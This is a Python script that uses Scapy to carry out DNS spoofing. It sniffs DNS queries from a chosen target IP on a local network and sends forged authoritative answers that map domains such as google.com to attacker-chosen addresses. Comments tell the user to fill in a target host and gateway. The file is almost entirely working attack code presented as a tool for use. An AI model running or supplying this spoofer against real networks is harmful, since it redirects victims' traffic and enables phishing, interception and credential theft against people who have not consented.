#!/usr/bin/env python3

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, send
import sys
import os
class DNSSpoofer:
    def __init__(self, interface, target_ip, gateway_ip):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.dns_records = {
            "example.com": "1.1.1.1",
            "google.com" : "2.2.2.2"
        }
        
        self.spoofing = False

    def handle_dns_request(self, packet):
        if packet.haslayer(DNSQR) and not packet.haslayer(DNSRR):  # DNS Question Record
            # Extract domain name from DNSQR
            domain = packet[DNSQR].qname.decode('utf-8').rstrip('.')
            print(f"[*] Intercepted DNS request for: {domain}")

            # Check if we have a spoofed record for this domain
            if self.is_targeted_domain(domain):
                spoofed_ip = self.dns_records[domain]
                print(f"[+] Spoofing {domain} -> {spoofed_ip}")

                # Create DNS response packet
                dns_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                             UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                             DNS(id=packet[DNS].id,
                                 qr=1,  # Response
                                 aa=1,  # Authoritative
                                 qd=packet[DNS].qd,
                                 an=DNSRR(rrname=packet[DNSQR].qname,
                                         rdata=spoofed_ip,
                                         ttl=60))

                # Send the spoofed response
                send(dns_response, iface=self.interface, verbose=False)
                print(f"[+] Sent spoofed DNS response for {domain}")

    def is_targeted_domain(self, domain) -> bool:
        #TODO: improve this 
        return domain in self.dns_records.keys()   

    def start(self):
        self.spoofing = True
        print(f"[*] Starting DNS spoofing...")
        print(f"[*] Target: {self.target_ip}")
        print(f"[*] Gateway: {self.gateway_ip}")
        print(f"[*] Spoofed DNS records: {self.dns_records}")

        try:
            # Sniff for DNS requests with a timeout to make it non-blocking
            sniff(filter=f"udp port 53 and host {self.target_ip}",
                  prn=self.handle_dns_request,
                  store=0,
                  iface=self.interface,
                  stop_filter=lambda p: not self.spoofing,
                  timeout=1)
        except KeyboardInterrupt:
            self.stop()
        except Exception as e:
            print(f"[!] Error in DNS spoofing: {e}")
            self.stop()

    def stop(self):
        print("\n[*] Stopping DNS spoofing...")
        self.spoofing = False


if __name__ == "__main__":
    # Example usage
    interface = "en0"  # Change this to your network interface
    target_ip = "192.168.0.187"  # Change this to your target's IP
    gateway_ip = "192.168.0.1"  # Change this to your gateway's IP
    # Dictionary of domains to spoof and their fake IP addresses

    spoofer = DNSSpoofer(interface, target_ip, gateway_ip)
    spoofer.start()
